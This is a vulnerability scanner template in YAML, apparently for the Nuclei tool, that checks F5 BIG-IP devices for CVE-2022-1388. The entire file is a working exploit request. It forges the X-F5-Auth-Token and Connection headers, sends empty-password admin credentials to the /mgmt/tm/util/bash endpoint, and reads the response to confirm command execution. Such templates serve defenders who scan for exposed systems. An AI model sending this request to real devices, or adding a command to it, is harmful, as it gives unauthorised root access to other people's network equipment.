id: CVE-2022-1388-F5-RCE

info:
  name: CVE-2022-1388-F5-RCE
  author: psc4re
  severity: critical
  tags: F5,BigIP,RCE,cve2022-1388
  reference:
    - https://twitter.com/jas502n/status/1523611433938059265?s=20&t=Gj2puPeyO-xikJ3ONS4Lew
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388 

requests:
  - raw:
      - |
        POST /mgmt/tm/util/bash HTTP/1.1
        Connection: keep-alive, X-F5-Auth-Token
        X-F5-Auth-Token: anything
        Authorization: Basic YWRtaW46
        Host: {{Hostname}}

        {"command":"run", "utilCmdArgs":"-c"}

        
    matchers:
      - type: dsl
        dsl:
           - contains(body, "tm:util:bash:runstate") && contains(body, "commandResult") && status_code==200
